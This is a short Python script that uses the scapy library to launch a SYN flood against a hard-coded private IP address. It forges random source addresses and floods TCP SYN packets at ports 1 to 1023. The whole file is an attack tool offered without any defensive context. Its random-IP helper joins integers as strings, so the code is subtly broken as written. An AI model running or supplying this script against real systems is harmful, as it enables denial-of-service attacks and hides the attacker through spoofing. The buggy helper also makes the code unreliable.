from scapy.all import *
from random import shuffle

def getRandomIP():
    ipfactors = [x for x in range(256)]
    tmpip = []
    for i in range(4):
        shuffle(ipfactors)
        tmpip.append(ipfactors[0])
    randomip = '.'.join(tmpip)
    return randomip

def synAttack(targetip):
    srcip = getRandomIP()
    P_IP = IP(src=srcip, dst=targetip)
    P_TCP = TCP(dport=range(1, 1024), flags='S')
    packet = P_IP / P_TCP
    srflood(packet, store=0)

def main():
    targetip = '192.168.0.5'
    synAttack(targetip)

if __name__ == "__main__":
    main()